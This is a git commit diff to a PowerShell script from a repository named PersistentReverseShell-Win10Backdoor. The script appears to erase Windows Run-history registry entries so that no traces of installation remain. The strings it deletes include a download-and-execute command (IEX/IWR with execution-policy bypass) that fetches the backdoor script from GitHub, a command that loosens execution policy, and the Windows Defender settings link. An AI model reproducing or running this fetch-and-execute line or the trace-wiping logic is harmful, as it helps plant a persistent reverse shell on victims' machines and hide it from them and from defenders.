7a6dda223d124451170e8a17b77e040ad44c4515
alariordas <80034759+alariordas@users.noreply.github.com>
2023-10-06 13:35:03 +0200

    Update ncinstallerdebug.ps1

--- ncinstallerdebug.ps1
+++ ncinstallerdebug.ps1
@@ -76,7 +76,7 @@ Write-Host "7/10: Removing Specific History Entries..."
 $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
 $runMRUEntries = Get-ItemProperty -Path $registryPath
 $stringsToDelete = @(
-    "powershell.exe -NoExit -nop -ep bypass -c IEX(IWR https://raw.githubusercontent.com/alariordas/PersistentReverseShell-Win10Backdoor/main/ncinstallerdebug.ps1 -UseBasicParsing);",
+    "powershell.exe -nop -ep bypass -c IEX(IWR https://raw.githubusercontent.com/alariordas/PersistentReverseShell-Win10Backdoor/main/ncinstallerdebug.ps1 -UseBasicParsing);",
     "Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force",
     "ms-settings:windowsdefender"
 )
